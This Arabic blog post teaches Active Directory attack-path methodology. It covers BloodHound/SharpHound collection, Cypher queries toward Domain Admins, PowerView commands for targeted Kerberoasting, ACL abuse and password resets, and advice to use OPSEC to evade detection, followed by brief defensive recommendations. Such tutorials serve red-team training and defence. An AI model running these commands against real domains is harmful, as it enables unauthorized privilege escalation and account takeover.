---
layout: blog
title: "مسارات الهجوم في Active Directory: منهجية البحث عن الثغرات وتسلسل الصلاحيات"
date: 2026-04-04T14:57:12Z
category: "منهجية"
excerpt: "في بيئات Active Directory، لا يكفي اختراق حساب واحد. النجاح الحقيقي يكمن في فهم مسارات الهجوم التي تربط بين الكائنات المختلفة. هذه المسارات تشكل خريطة طريق للوصول من نقطة دخول بسيطة إلى Domain Admin. نستعرض هنا منهجية احترافية لاكتشاف واستغلال هذه المسارات."
read_time: 8
tags: ["Active Directory", "Privilege Escalation", "BloodHound", "Attack Paths", "Post-Exploitation"]
slug: "ad-attack-paths"
image: "/OffsecAR/assets/images/blogs/ad-attack-paths.svg"
---

## فهم Attack Paths في Active Directory

عندما نتحدث عن Attack Paths، نعني سلسلة من العلاقات والصلاحيات التي يمكن استغلالها للانتقال من كائن منخفض الامتياز إلى هدف عالي القيمة. البيئة ليست مسطحة، بل شبكة معقدة من Trust Relationships وPermissions وGroup Memberships.

المهاجم الماهر لا يبحث عن ثغرة واحدة مدمرة، بل يفهم كيف تتشابك الصلاحيات. حساب مستخدم عادي قد يملك GenericAll على Group، والـ Group يملك WriteDacl على Computer، والـ Computer يحوي Unconstrained Delegation. هذا مسار هجوم كامل.

## أدوات التعداد والتحليل

أداة BloodHound أحدثت ثورة في هذا المجال. تجمع البيانات من Active Directory وتحللها كـ Graph Database، مما يكشف العلاقات المخفية.

```powershell
# جمع البيانات باستخدام SharpHound
.\SharpHound.exe -c All,GPOLocalGroup --outputdirectory C:\temp

# أو استخدام Python ingestor
bloodhound-python -d corp.local -u user -p pass -c All -ns 10.10.10.10
```

بعد رفع البيانات لـ BloodHound، نستخدم Cypher queries للبحث عن مسارات محددة:

```cypher
// إيجاد أقصر مسار من Owned Users إلى Domain Admins
MATCH p=shortestPath((u:User {owned:true})-[*1..]->(g:Group))
WHERE g.name =~ 'DOMAIN ADMINS@.*'
RETURN p

// كشف Users مع Unconstrained Delegation
MATCH (u:User {unconstraineddelegation:true}) RETURN u

// إيجاد Computers يمكن الوصول إليها عبر Local Admin
MATCH p=(u:User)-[:AdminTo*1..]->(c:Computer) 
WHERE u.name =~ 'CURRENT_USER@.*'
RETURN p
```

## أنماط المسارات الشائعة

### GenericAll/GenericWrite على Users
هذه الصلاحيات تسمح بتعديل خصائص المستخدم، بما في ذلك إضافة SPN للـ Kerberoasting أو تغيير كلمة المرور.

```powershell
# إضافة SPN للمستخدم المستهدف
Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='ops/whatever'}

# طلب TGS وكسره
Request-SPNTicket -SPN 'ops/whatever' | Export-Clixml ticket.xml
```

### WriteDacl/WriteOwner
القدرة على تعديل ACLs تعني إعطاء نفسك أي صلاحية تريدها.

```powershell
# منح نفسك GenericAll على الكائن
Add-DomainObjectAcl -TargetIdentity targetuser -PrincipalIdentity attacker -Rights All

# ثم تغيير كلمة المرور
$pass = ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force
Set-DomainUserPassword -Identity targetuser -AccountPassword $pass
```

### Group Membership Chains
العضوية المتداخلة في Groups تخلق مسارات غير مرئية. User في GroupA، وGroupA في GroupB، وGroupB لديها صلاحيات حساسة.

### GPO-Based Attacks
إذا كان لديك تحكم في GPO يطبق على OU معينة، يمكنك تنفيذ أوامر على جميع الأجهزة فيها.

## منهجية الاستغلال العملية

الخطوة الأولى هي تحديد موقعك الحالي. أي صلاحيات تملك؟ أي Groups تنتمي إليها؟

```powershell
# معرفة صلاحياتك الحالية
whoami /all

# تعداد Group Memberships
Get-DomainGroup -UserName currentuser

# كشف Outbound Object Control
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match 'currentuser'}
```

الخطوة الثانية هي رسم المسارات الممكنة. استخدم BloodHound لتحديد أقصر طريق نحو الهدف. قد يكون الطريق المباشر محميًا، لكن المسار الجانبي عبر Service Accounts أو Computers قد يكون مفتوحًا.

الخطوة الثالثة هي التنفيذ التدريجي. كل قفزة في المسار تحتاج validation قبل الانتقال للتالية. احفظ Credentials المكتسبة، واستخدم OPSEC الجيد لتجنب Detection.

## الدفاع ضد Attack Paths

من منظور defensive، فهم هذه المسارات ضروري. قم بتشغيل BloodHound دوريًا على بيئتك الخاصة. ابحث عن:

- Users مع صلاحيات مفرطة
- Nested Groups غير ضرورية
- Stale Accounts مع امتيازات عالية
- Delegation Configurations الخطرة

استخدم أدوات مثل PingCastle وPurpleKnight لتقييم وضعك الأمني. طبق Tier Model لعزل الصلاحيات الإدارية. راجع ACLs بانتظام وأزل الصلاحيات غير المبررة.

## الخلاصة

مسارات الهجوم في Active Directory ليست ثغرات بالمعنى التقليدي، بل تكوينات تراكمية تخلق فرصًا. الفهم العميق لـ Graph Theory وعلاقات الصلاحيات يحول المهاجم من Opportunistic إلى Methodical. سواء كنت Red Teamer أو Defender، BloodHound وأدوات تحليل المسارات أصبحت أساسية في ترسانتك.
